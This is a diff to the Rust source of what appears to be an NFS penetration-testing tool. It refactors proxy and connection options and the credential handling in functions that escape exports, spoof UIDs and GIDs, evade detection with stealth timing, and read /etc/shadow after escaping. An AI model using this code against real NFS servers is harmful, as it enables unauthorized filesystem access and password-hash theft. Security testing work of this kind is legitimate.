@@ -31,7 +31,7 @@ use colored::Colorize as _;
 
 use crate::cli::probe::{build_gid_list, make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_OUTPUT, H_TARGET};
-use crate::engine::credential::credential_ladder_with;
+use crate::engine::credential::{Identity, ObservedIdentities, identity_ladder};
 use crate::engine::escape::{AccessRank, AnnotatedTreeTop, DiscoveredExport, EscapeCandidate, EscapeSeed, EscapeStats, PipelineConfig, ROOTFS_THRESHOLD, VerifiedTreeTop, construct_candidates, dedup_and_filter, dedup_by_filesystem, rootfs_score, score_and_annotate};
 use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::circuit::CircuitBreaker;
@@ -362,7 +362,7 @@ async fn phase1_gather_seeds_fast(host: &str, export: &str, addr: SocketAddr, mo
                 upward_chain_v3(&v3, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;
             },
             ActiveVersion::V2 => {
-                let (_, _, v2) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+                let (_, _, v2) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
                 upward_chain_v2(&v2, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;
             },
             ActiveVersion::V4 => {
@@ -445,7 +445,7 @@ async fn phase1_gather_seeds_full(host: &str, export: &str, addr: SocketAddr, mo
 
         // v2 LOOKUP ".." chain
         {
-            let (_, _, v2) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+            let (_, _, v2) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
             upward_chain_v2(&v2, &seed.handle, &seed.source, &mut seeds, &mut seen, stealth).await;
         }
 
@@ -640,7 +640,7 @@ async fn acquire_handles_for_export(host: &str, export_path: &str, addr: SocketA
 
     // Children from v2 export boundary (READDIR + LOOKUP, first 10)
     if let Some(ref v1_fh) = v1_handle {
-        let (_, _, v2_client) = make_v2_client_with_hostname(addr, export_path, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+        let (_, _, v2_client) = make_v2_client_with_hostname(addr, export_path, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
         let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(v1_fh.as_bytes());
         stealth.wait().await;
         if let Ok(entries) = v2_client.readdir(&v2_fh, 0, 8192).await {
@@ -722,7 +722,7 @@ async fn protocol_singles(host: &str, addr: SocketAddr, stealth: &StealthConfig,
 
     // WebNFS public v3: zero-length handle, test via LOOKUP "."
     {
-        let (_, _, v3_client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+        let (_, _, v3_client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), &globals.connect_opts(), globals.nfs_port, &globals.hostname);
         let public_v3 = FileHandle::from_bytes(&[]);
         stealth.wait().await;
         if v3_client.resolve(&public_v3, ".").await.is_ok() && seen.insert(Vec::new()) {
@@ -732,7 +732,7 @@ async fn protocol_singles(host: &str, addr: SocketAddr, stealth: &StealthConfig,
 
     // WebNFS public v2: all-zero 32 bytes, test via GETATTR
     {
-        let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+        let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), &globals.connect_opts(), globals.nfs_port, &globals.hostname);
         let public_v2 = nfs_v2::wire::Nfs2FileHandle([0u8; 32]);
         stealth.wait().await;
         if v2_client.getattr(&public_v2).await.is_ok() {
@@ -745,7 +745,7 @@ async fn protocol_singles(host: &str, addr: SocketAddr, stealth: &StealthConfig,
 
     // NFSPROC_ROOT v2
     {
-        let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+        let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), &globals.connect_opts(), globals.nfs_port, &globals.hostname);
         stealth.wait().await;
         if let Ok(Some(root_fh)) = v2_client.root().await {
             let fh = FileHandle::from_bytes(&root_fh.0);
@@ -862,7 +862,7 @@ async fn probe_candidates(candidates: &[EscapeCandidate], addr: SocketAddr, expo
     let v3_client = if active_version.is_none() || active_version == Some(ActiveVersion::V3) { Some(make_v3_client(addr, export, stealth.clone(), nfs_port, globals)) } else { None };
 
     let v2_client = if active_version.is_none() || active_version == Some(ActiveVersion::V2) {
-        let (_, _, c) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+        let (_, _, c) = make_v2_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
         Some(c)
     } else {
         None
@@ -965,34 +965,33 @@ async fn probe_and_confirm_v3(client: &Nfs3Client, candidate: &EscapeCandidate, 
             // Get owner info from nobody
             let owner_info = nobody_client.attrs(fh).await.ok().map(|a| ((a.uid, a.gid), a.mode));
 
-            let ladder = credential_ladder_with((client.uid(), client.gid()), owner_info.map(|(ug, _)| ug), owner_info.map(|(_, m)| m), &[]);
+            // Each rung claims the operator's groups and the handle's group
+            // alongside its UID (engine::credential).
+            let caller = Identity::new(client.uid(), client.gid(), &build_gid_list(client.gid(), &globals.aux_gids));
+            let ladder = identity_ladder(&caller, owner_info.map(|(ug, _)| ug), owner_info.map(|(_, m)| m), &ObservedIdentities::default());
 
-            for (uid, gid) in &ladder {
-                let gids = build_gid_list(*gid, &globals.aux_gids);
-                let cred = Credential::Sys(AuthSys::with_groups(*uid, *gid, &gids, client.machinename()));
-                let esc = client.with_credential(cred, *uid, *gid);
+            for id in &ladder {
+                let esc = client.with_credential(id.credential(client.machinename()), id.uid, id.gid);
 
                 stealth.wait().await;
                 if let Ok((parent, _)) = esc.resolve(fh, "..").await {
                     if parent.as_bytes() == fh.as_bytes() {
-                        return Some((*uid, *gid));
+                        return Some((id.uid, id.gid));
                     }
                     if let (Ok(self_a), Ok(parent_a)) = (esc.attrs(fh).await, esc.attrs(&parent).await)
                         && self_a.fileid == parent_a.fileid
                     {
-                        return Some((*uid, *gid));
+                        return Some((id.uid, id.gid));
                     }
                 }
             }
 
             // Fallback: try LOOKUP of well-known names to confirm tree-top
             for name in ["etc", "bin", "usr", "var", "lib"] {
-                for (uid, gid) in &ladder {
-                    let gids = build_gid_list(*gid, &globals.aux_gids);
-                    let cred = Credential::Sys(AuthSys::with_groups(*uid, *gid, &gids, client.machinename()));
-                    let esc = client.with_credential(cred, *uid, *gid);
+                for id in &ladder {
+                    let esc = client.with_credential(id.credential(client.machinename()), id.uid, id.gid);
                     if esc.resolve(fh, name).await.is_ok() {
-                        return Some((*uid, *gid));
+                        return Some((id.uid, id.gid));
                     }
                 }
             }
@@ -1121,7 +1120,7 @@ async fn list_tree_top_children(tt: &VerifiedTreeTop, addr: SocketAddr, export: 
 
     // Prefer v3 (READDIRPLUS returns names + handles in one call)
     if tt.v3_confirmed {
-        let (_, _, v3) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+        let (_, _, v3) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
         stealth.wait().await;
         if let Ok(page) = v3.list_dir_page(fh, 0, nfs_v3::wire::cookieverf3::default()).await {
             return page.entries.iter().filter(|e| e.name != "." && e.name != "..").map(|e| e.name.clone()).collect();
@@ -1139,7 +1138,7 @@ async fn list_tree_top_children(tt: &VerifiedTreeTop, addr: SocketAddr, export: 
 
     // Fallback: v2
     if tt.v2_confirmed {
-        let (_, _, v2) = make_v2_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+        let (_, _, v2) = make_v2_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
         let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(fh.as_bytes());
         stealth.wait().await;
         if let Ok(entries) = v2.readdir(&v2_fh, 0, 8192).await {
@@ -1177,7 +1176,7 @@ async fn probe_access_rank(tt: &VerifiedTreeTop, addr: SocketAddr, export: &str,
 
     // Prefer v3 for the squash probe (most capable, has ACCESS procedure)
     if tt.v3_confirmed {
-        let (_, _, v3_root) = make_client_with_hostname(addr, export, 0, 42, &[42], stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+        let (_, _, v3_root) = make_client_with_hostname(addr, export, 0, 42, &[42], stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
         stealth.wait().await;
         let root_probe = try_read_file_v3(&v3_root, fh, &["etc", "shadow"]).await;
 
@@ -1189,7 +1188,7 @@ async fn probe_access_rank(tt: &VerifiedTreeTop, addr: SocketAddr, export: &str,
             },
             SquashProbe::Denied => {
                 // Root denied -- could be root_squash or all_squash
-                let (_, _, v3_user) = make_client_with_hostname(addr, export, 1000, 42, &[42], stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+                let (_, _, v3_user) = make_client_with_hostname(addr, export, 1000, 42, &[42], stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
                 stealth.wait().await;
                 let user_probe = try_read_file_v3(&v3_user, fh, &["etc", "shadow"]).await;
                 match user_probe {
@@ -1289,10 +1288,7 @@ async fn check_write_access_v3(client: &Nfs3Client, dir: &FileHandle, stealth: &
 fn make_v4_pooled_client_with_creds(addr: SocketAddr, export: &str, stealth: StealthConfig, nfs_port: u16, globals: &GlobalOpts, uid: u32, gid: u32) -> crate::proto::nfs4::Nfs4Client {
     use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;
 
-    let pool = Arc::new(match &globals.proxy {
-        Some(p) => ConnectionPool::with_proxy(p.clone()),
-        None => ConnectionPool::default_config(),
-    });
+    let pool = Arc::new(ConnectionPool::with_opts(globals.connect_opts()));
     let circuit = Arc::new(CircuitBreaker::default_config());
     let gids = build_gid_list(gid, &globals.aux_gids);
     let cred = Credential::Sys(AuthSys::with_groups(uid, gid, &gids, &globals.hostname));
@@ -1464,7 +1460,7 @@ async fn read_shadow(annotated: &[AnnotatedTreeTop], addr: SocketAddr, export: &
 
     let uid = att.tree_top.uid;
     let gid = att.tree_top.gid;
-    let (_, _, client) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+    let (_, _, client) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
 
     try_read_shadow_post_escape(&client, &att.tree_top.candidate.handle).await;
 }
@@ -1479,7 +1475,7 @@ async fn read_shadow_json(annotated: &[AnnotatedTreeTop], addr: SocketAddr, expo
     let gid = best_os.tree_top.gid;
     let root_fh = &best_os.tree_top.candidate.handle;
 
-    let (_, _, client) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+    let (_, _, client) = make_client_with_hostname(addr, export, uid, gid, &globals.aux_gids, stealth.clone(), &globals.connect_opts(), Some(nfs_port), &globals.hostname);
 
     let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else {
         return Some(serde_json::json!({"readable": false}));
@@ -1554,10 +1550,7 @@ async fn acquire_v4_lookup_handle(host: &str, export: &str, globals: &GlobalOpts
     let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
     let nfs_port = globals.nfs_port.unwrap_or(2049);
 
-    let pool = Arc::new(match &globals.proxy {
-        Some(p) => ConnectionPool::with_proxy(p.clone()),
-        None => ConnectionPool::default_config(),
-    });
+    let pool = Arc::new(ConnectionPool::with_opts(globals.connect_opts()));
     let circuit = Arc::new(CircuitBreaker::default_config());
     let stealth = StealthConfig::new(globals.delay, globals.jitter);
     let gids = build_gid_list(globals.gid, &globals.aux_gids);
@@ -1589,10 +1582,7 @@ async fn gather_v4_export_seeds(host: &str, globals: &GlobalOpts) -> Vec<(String
     let Ok(addr) = parse_addr_with_port(host, globals.nfs_port) else { return Vec::new() };
     let nfs_port = globals.nfs_port.unwrap_or(2049);
 
-    let pool = Arc::new(match &globals.proxy {
-        Some(p) => ConnectionPool::with_proxy(p.clone()),
-        None => ConnectionPool::default_config(),
-    });
+    let pool = Arc::new(ConnectionPool::with_opts(globals.connect_opts()));
     let circuit = Arc::new(CircuitBreaker::default_config());
     let stealth = StealthConfig::new(globals.delay, globals.jitter);
     let gids = build_gid_list(globals.gid, &globals.aux_gids);
@@ -1660,7 +1650,7 @@ async fn gather_v4_export_seeds(host: &str, globals: &GlobalOpts) -> Vec<(String
 
 /// Build an NFSv3 pooled client with the global credentials.
 fn make_v3_client(addr: SocketAddr, export: &str, stealth: StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> Nfs3Client {
-    let (_, _, client) = make_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth, globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
+    let (_, _, client) = make_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth, &globals.connect_opts(), Some(nfs_port), &globals.hostname);
     client
 }
 
@@ -1677,10 +1667,7 @@ async fn make_v4_direct_client(addr: SocketAddr, globals: &GlobalOpts) -> anyhow
 fn make_v4_pooled_client(addr: SocketAddr, export: &str, stealth: StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> crate::proto::nfs4::Nfs4Client {
     use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;
 
-    let pool = Arc::new(match &globals.proxy {
-        Some(p) => ConnectionPool::with_proxy(p.clone()),
-        None => ConnectionPool::default_config(),
-    });
+    let pool = Arc::new(ConnectionPool::with_opts(globals.connect_opts()));
     let circuit = Arc::new(CircuitBreaker::default_config());
     let gids = build_gid_list(globals.gid, &globals.aux_gids);
     let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
